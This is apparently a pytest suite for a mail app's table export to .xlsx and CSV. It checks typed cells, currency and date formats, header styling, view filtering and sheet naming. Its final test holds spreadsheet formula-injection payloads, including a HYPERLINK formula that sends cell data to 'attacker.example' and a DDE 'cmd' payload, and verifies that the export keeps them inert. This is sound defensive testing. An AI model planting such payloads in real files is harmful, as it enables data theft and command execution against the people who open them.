# ACT-SURFACES: api
"""table.export_xlsx: a table as an .xlsx workbook (mailr/tables/xlsxio.py). The file is opened
with openpyxl and its cells checked by type: numbers, amounts with their currency format, dates
and date-times as dates, checkboxes as TRUE/FALSE, multi-select joined, links by title; a bold,
frozen header and column widths; the current view only; one sheet per table."""

from __future__ import annotations

import io
import json
from datetime import datetime

import pytest
from helpers.tables import col, new_table, opt
from openpyxl import load_workbook

# These tests never touch the mail store: database-only users (conftest.make_db_user).
pytestmark = pytest.mark.db_user

API = "/api/v1"
XLSX = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"


async def _book(client, path, **params):
    r = await client.get(f"{API}{path}", params=params)
    assert r.status_code == 200, r.text
    assert r.headers["content-type"] == XLSX
    return load_workbook(io.BytesIO(r.content)), r


async def _shop(client):
    note = (await client.post(f"{API}/notes", json={"kind": "text", "title": "Supplier terms"})).json()["note"]
    t = await new_table(client, name="Orders: Q4/2026", columns=[
        {"name": "Item", "type": "text"},
        {"name": "Qty", "type": "number"},
        {"name": "Share", "type": "number", "config": {"format": "percent", "decimals": 1}},
        {"name": "Price", "type": "currency", "config": {"currency": "USD"}},
        {"name": "Fee", "type": "currency", "config": {"currency": "SEK", "decimals": 0}},
        {"name": "Due", "type": "date"},
        {"name": "Call", "type": "datetime"},
        {"name": "Paid", "type": "checkbox"},
        {"name": "Status", "type": "select", "options": ["Open", "Shipped"]},
        {"name": "Tags", "type": "multi_select", "options": ["Rush", "Gift", "Bulk"]},
        {"name": "See", "type": "link", "config": {"target": "note"}},
    ])
    c = {x["name"]: x["id"] for x in t["columns"]}
    rows = [
        {c["Item"]: "Pens", c["Qty"]: "12", c["Share"]: "0.255", c["Price"]: "3.5", c["Fee"]: "40",
         c["Due"]: "2026-10-01", c["Call"]: {"at": "2026-10-02T14:30", "tz": "America/Chicago"}, c["Paid"]: True,
         c["Status"]: opt(t, "Status", "Shipped"), c["Tags"]: [opt(t, "Tags", "Rush"), opt(t, "Tags", "Gift")],
         c["See"]: [{"kind": "note", "id": note["id"]}]},
        {c["Item"]: "Ink", c["Qty"]: "2", c["Paid"]: False, c["Status"]: opt(t, "Status", "Open")},
    ]
    r = await client.post(f"{API}/tables/{t['id']}/rows", json={"rows": [{"cells": x} for x in rows]})
    assert r.status_code == 200, r.text
    return t


async def test_xlsx_export_types_header_and_widths(client):
    t = await _shop(client)
    wb, r = await _book(client, f"/tables/{t['id']}/export.xlsx")
    assert 'filename="Orders_ Q4_2026.xlsx"' in r.headers["content-disposition"]
    assert wb.sheetnames == ["Orders  Q4 2026"]  # no ":" or "/" in a sheet name
    ws = wb.active
    head = [x.value for x in ws[1]]
    assert head == ["Item", "Qty", "Share", "Price", "Fee", "Due", "Call", "Paid", "Status", "Tags", "See"]
    assert all(x.font.bold for x in ws[1]) and ws.freeze_panes == "A2"
    row = {h: ws.cell(row=2, column=j + 1) for j, h in enumerate(head)}
    assert row["Item"].value == "Pens" and row["Item"].data_type == "s"
    assert row["Qty"].value == 12 and isinstance(row["Qty"].value, int)
    assert row["Share"].value == 0.255 and row["Share"].number_format == "0.0%"
    assert row["Price"].value == 3.5 and row["Price"].number_format == '"$"#,##0.00'
    assert row["Fee"].value == 40 and row["Fee"].number_format == '#,##0 "SEK"'
    assert row["Due"].value == datetime(2026, 10, 1) and row["Due"].is_date and row["Due"].number_format == "yyyy-mm-dd"
    assert row["Call"].value == datetime(2026, 10, 2, 14, 30) and row["Call"].is_date  # the wall time shown
    assert row["Paid"].value is True and row["Paid"].data_type == "b"
    assert row["Status"].value == "Shipped"
    assert row["Tags"].value == "Rush; Gift"
    assert row["See"].value == "Supplier terms"
    ink = {h: ws.cell(row=3, column=j + 1).value for j, h in enumerate(head)}
    assert ink["Paid"] is False and ink["Price"] is None and ink["Tags"] is None
    widths = {h: ws.column_dimensions[chr(ord("A") + j)].width for j, h in enumerate(head)}
    assert widths["Item"] >= 8 and widths["See"] >= len("Supplier terms") and widths["Due"] >= 10


async def test_xlsx_export_current_view_and_one_sheet_per_table(client):
    t = await _shop(client)
    status, paid = col(t, "Status"), col(t, "Paid")
    spec = {"filters": [{"col": status, "op": "is", "value": opt(t, "Status", "Open")}], "hidden": [paid]}
    wb, _ = await _book(client, f"/tables/{t['id']}/export.xlsx", scope="view", spec=json.dumps(spec))
    ws = wb.active
    assert "Paid" not in [x.value for x in ws[1]]
    assert ws.max_row == 2 and ws.cell(row=2, column=1).value == "Ink"
    # Several tables: one sheet each, in the order asked; equal names stay apart.
    other = await new_table(client, name="Orders: Q4/2026")
    wb, r = await _book(client, "/tables/export.xlsx", ids=f"{t['id']},{other['id']}")
    assert wb.sheetnames == ["Orders  Q4 2026", "Orders  Q4 2026 (2)"]
    assert 'filename="tables.xlsx"' in r.headers["content-disposition"]
    assert (await client.get(f"{API}/tables/export.xlsx", params={"ids": ""})).status_code == 400
    assert (await client.get(f"{API}/tables/export.xlsx", params={"ids": "t0000000"})).status_code == 404


async def test_exported_text_is_never_a_formula(client):
    """Text that starts like a formula (from a sharee, or copied from mail) stays text: a string cell
    in the workbook, and a leading apostrophe in CSV. Negative numbers stay numbers."""
    import csv

    t = await new_table(client, name="Leads", columns=[{"name": "=Name", "type": "text"},
                                                       {"name": "Amount", "type": "number"}])
    c = [x["id"] for x in t["columns"]]
    evil = ['=HYPERLINK("https://attacker.example/?d="&A2,"Open")', "+1+cmd|' /C calc'!A0", "@SUM(1)", "-2+3",
            "\tx"]
    r = await client.post(f"{API}/tables/{t['id']}/rows",
                          json={"rows": [{"cells": {c[0]: v, c[1]: "-12.5"}} for v in evil]})
    assert r.status_code == 200, r.text
    wb, _ = await _book(client, f"/tables/{t['id']}/export.xlsx")
    ws = wb.worksheets[0]
    cells = [ws.cell(row=i, column=1) for i in range(1, len(evil) + 2)]
    assert all(x.data_type == "s" for x in cells), [(x.value, x.data_type) for x in cells]
    assert ws.cell(row=2, column=2).value == -12.5
    r = await client.get(f"{API}/tables/{t['id']}/export.csv")
    rows = list(csv.reader(io.StringIO(r.text)))
    assert rows[0][0] == "'=Name"
    assert {row[0][:1] for row in rows[1:]} == {"'"} and {row[1] for row in rows[1:]} == {"-12.5"}
